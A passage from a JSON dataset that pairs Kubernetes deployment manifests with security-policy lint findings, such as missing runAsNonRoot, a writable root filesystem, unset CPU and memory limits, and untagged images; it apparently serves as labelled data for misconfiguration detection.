    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces0\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop:\n        - ALL\n  securityContext:\n    runAsNonRoot: true\n    seccompProfile:\n      type: RuntimeDefault\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "00878",
    "manifest_path": "data/manifests/the_stack_sample/sample_0195.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources: {}\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"sabnzbd\" does not have a read-only root file system"
  },
  {
    "id": "00879",
    "manifest_path": "data/manifests/the_stack_sample/sample_0195.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources: {}\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"sabnzbd\" is not set to runAsNonRoot"
  },
  {
    "id": "00880",
    "manifest_path": "data/manifests/the_stack_sample/sample_0195.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources: {}\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"sabnzbd\" has cpu request 0"
  },
  {
    "id": "00881",
    "manifest_path": "data/manifests/the_stack_sample/sample_0195.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: sabnzbd\n  namespace: usenet\n  annotations:\n    reloader.stakater.com/auto: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: sabnzbd\n  template:\n    metadata:\n      labels:\n        app: sabnzbd\n    spec:\n      containers:\n      - name: sabnzbd\n        image: lscr.io/linuxserver/sabnzbd:3.4.2-ls51\n        env:\n        - name: PGID\n          value: '2000'\n        - name: PUID\n          value: '2000'\n        - name: TZ\n          value: Europe/Zurich\n        - name: DOCKER_MODS\n          value: containeroo/docker-mods:sabnzbd-mkvtoolnix|containeroo/docker-mods:sabnzbd-nzbnotify\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /config\n          name: data\n        - mountPath: /incomplete-downloads\n          name: incomplete-downloads\n        - mountPath: /downloads\n          name: downloads\n        - mountPath: /app/sabnzbd/scripts/merge_subtitles.sh\n          name: merge-subtitles\n          subPath: merge_subtitles.sh\n        - mountPath: /tmp/startup_probe.sh\n          name: sabnzbd-startup\n          subPath: startup_probe.sh\n        startupProbe:\n          exec:\n            command:\n            - bash\n            - -c\n            - /tmp/startup_probe.sh\n          initialDelaySeconds: 30\n          failureThreshold: 30\n          timeoutSeconds: 10\n          periodSeconds: 5\n        livenessProbe:\n          tcpSocket:\n            port: 8080\n          failureThreshold: 2\n          timeoutSeconds: 5\n          periodSeconds: 30\n        resources: {}\n      volumes:\n      - name: data\n        persistentVolumeClaim:\n          claimName: sabnzbd-data\n      - name: merge-subtitles\n        configMap:\n          name: merge-subtitles\n          items:\n          - key: merge_subtitles.sh\n            path: merge_subtitles.sh\n          defaultMode: 511\n      - name: sabnzbd-startup\n        configMap:\n          name: sabnzbd-startup\n          items:\n          - key: startup_probe.sh\n            path: startup_probe.sh\n          defaultMode: 511\n      - name: incomplete-downloads\n        hostPath:\n          path: /mnt/disk06/downloads/incomplete\n          type: Directory\n      - name: downloads\n        hostPath:\n          path: /mnt/disk06/downloads/complete\n          type: Directory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"sabnzbd\" has memory limit 0"
  },
  {
    "id": "00882",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"myapp-container\" is using an invalid container image, \"cewuandy/nextepc-base\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00883",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-network-client\" does not have a read-only root file system"
  },
  {
    "id": "00884",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"myapp-container\" does not have a read-only root file system"
  },
  {
    "id": "00885",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-network-client\" is not set to runAsNonRoot"
  },
  {
    "id": "00886",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"myapp-container\" is not set to runAsNonRoot"
  },
  {
    "id": "00887",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-network-client\" has cpu request 0"
  },
  {
    "id": "00888",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"myapp-container\" has cpu request 0"
  },
  {
    "id": "00889",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-network-client\" has memory limit 0"
  },
  {
    "id": "00890",
    "manifest_path": "data/manifests/the_stack_sample/sample_0196.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nextepc-mme-deployment\nspec:\n  selector:\n    matchLabels:\n      app: nextepc-mme\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nextepc-mme\n    spec:\n      containers:\n      - name: myapp-container\n        image: cewuandy/nextepc-base\n        imagePullPolicy: Always\n        command:\n        - /bin/sh\n        args:\n        - -c\n        - /root/nextepc/nextepc-mmed\n        volumeMounts:\n        - name: nextepc-conf\n          mountPath: /root/nextepc/install/etc/nextepc/\n      initContainers:\n      - name: init-network-client\n        image: sdnvortex/network-controller:v0.4.9\n        command:\n        - /go/bin/client\n        args:\n        - -s=unix:///tmp/vortex.sock\n        - -b=br0\n        - -n=eth1\n        - -i=192.188.2.2/24\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: POD_UUID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.uid\n        volumeMounts:\n        - mountPath: /tmp/\n          name: grpc-sock\n      volumes:\n      - name: grpc-sock\n        hostPath:\n          path: /tmp/vortex/\n      - name: nextepc-conf\n        configMap:\n          name: nextepc-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"myapp-container\" has memory limit 0"
  },
  {
    "id": "00891",
    "manifest_path": "data/manifests/the_stack_sample/sample_0202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "00892",
    "manifest_path": "data/manifests/the_stack_sample/sample_0202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "00893",
    "manifest_path": "data/manifests/the_stack_sample/sample_0202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "00894",
    "manifest_path": "data/manifests/the_stack_sample/sample_0202.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20200710-7fa016752a\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "00895",
    "manifest_path": "data/manifests/the_stack_sample/sample_0204.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: linkis-mdm-server-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: linkis-mdm-server\n  template:\n    metadata:\n      labels:\n        app: linkis-mdm-server\n    spec:\n      affinity:\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: app\n                operator: In\n                values:\n                - linkis-mdm-server\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - name: linkis-mdm-server\n        image: zhangrong1027/linkis:linkis-mdm-server-0.10.0\n        imagePullPolicy: Always\n        ports:\n        - name: http\n          containerPort: 22001\n        livenessProbe:\n          tcpSocket:\n            port: 22001\n          initialDelaySeconds: 15\n          periodSeconds: 20\n        env:\n        - name: eurekaurl\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: EUREKA_URL\n          valueFrom:\n            configMapKeyRef:\n              name: eureka-config\n              key: eurekaUrl\n        - name: SERVER_HEAP_SIZE\n          value: 1024M\n        - name: START_PORT\n          value: '22001'\n        volumeMounts:\n        - name: linkis-mdm-server-config\n          mountPath: /opt/ihome/conf\n        - name: varlog\n          mountPath: /opt/ihome/linkis-mdm-server/logs\n      volumes:\n      - name: linkis-mdm-server-config\n        configMap:\n          name: linkis-mdm-server-config\n      - name: varlog\n        hostPath:\n          path: /var/log\n      - name: eureka-config\n        configMap:\n          name: eureka-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"linkis-mdm-server\" does not have a read-only root file system"
  },
  {
    "id": "00896",
    "manifest_path": "data/manifests/the_stack_sample/sample_0204.yaml",
